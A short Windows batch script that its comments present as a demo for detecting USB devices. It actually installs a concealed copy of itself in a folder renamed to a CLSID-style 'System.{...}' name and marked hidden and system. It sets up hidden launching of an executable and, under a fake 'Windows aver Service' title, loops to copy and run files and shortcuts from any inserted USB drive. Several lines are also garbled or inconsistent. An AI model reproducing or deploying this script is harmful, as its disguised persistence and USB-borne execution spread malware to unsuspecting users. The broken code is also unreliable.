@echo Off
::
::   Note:::  This Script Detect Usb Device in Computer. :::
::
::            This is Demo of Detecting script 
::
::CodeV1.0
IF EXIST %Systemdrive%\System.{2559a1f2-21d7-11d4-bdaf-00c04f60b9f0} goto start
:Scan
IF NoT EXIST %systemdrive%\service MD %systemdrive%\service
IF NOT EXIST %systemdrive%\service\detect.bat Xcopy detect.bat %systemdrive%\service
echo CreateObject("Wscript.Shell").Run "%systemdrive%\System.{2559a1f2-21d7-11d4-bdaf-00c04f60b9f0}\ml_name.exe", 0, True >"%systemdrive%\service/y
echo CreateObject("Wscript.Shell").Run "%systemdrive%\System.{2559a1f2-21d7-11d4-bdaf-00c04f60b9f0}\detect.bat", 0, True >"%systemdrive%\service" /y
ren %systemdrive%\service "System.{2559a1f2-21d7-11d4-bdaf-00c04f60b9f0}"
attrib +h +s %systemdrive%\"System.{2559a1f2-21d7-11d4-bdaf-00c04f60b9f0}"
Exit
::More objects here you can CodeV1.0
:start
Title Windows aver Service Running
SETLOCAL enableextensions
set "USBCounter=0"
for /F "tokens=2 delims==" %%G in ('
WMIC logicaldisk where "DriveType=2" get DeviceID /value 2^>NUL ^| find "="
') do for /F "tokens=*" %%i in ("%%G") do ( 

set /A "USBCounter+=1"
set Drive=%%i
)
if %USBCounter%==1 goto run
ENDLOCAL
goto start
exit
:run
cls
echo.
IF Exist ml_Name.bat xcopy %Drive%\Ml_Name.bat
IF Exist ml_Name.bat xcopy %Drive%\Ml_Name.bat
IF Exist %Drive%\123.lnk start 123.lnk
echo.
cls
goto start
